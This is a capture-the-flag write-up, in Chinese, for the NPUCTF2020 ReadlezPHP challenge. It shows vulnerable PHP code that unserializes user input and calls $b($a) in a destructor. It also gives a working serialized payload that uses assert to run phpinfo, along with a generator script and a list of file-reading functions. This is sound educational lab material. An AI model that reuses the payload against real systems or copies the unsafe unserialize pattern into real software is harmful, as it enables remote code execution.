# \[NPUCTF2020]ReadlezPHP

## \[NPUCTF2020]ReadlezPHP

## 考点

* PHP反序列化
* 动态调用函数函数
* eval()特性

## wp

有个页面`time.php?source`

![](<../../.gitbook/assets/image (12) (1) (1).png>)

访问后得到源码，是php反序列化

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

payload：`time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:10:"phpinfo();";s:1:"b";s:6:"assert";}`

```php
<?php
class HelloPhp
{
    public $a = 'phpinfo();';
    public $b = 'assert';

}
$c = new HelloPhp;

echo serialize($c);
```

## 小结

1. 为什么不能用eval呢？因为<mark style="color:red;">eval是构造器，不算是个函数，不能使用$b($a)的方式调用</mark>。
2. 读取文件的函数：<mark style="color:orange;">`readfile`</mark>，<mark style="color:orange;">`show_source`</mark>，<mark style="color:orange;">`highlight_file`</mark>，<mark style="color:orange;">`file_get_contents`</mark>
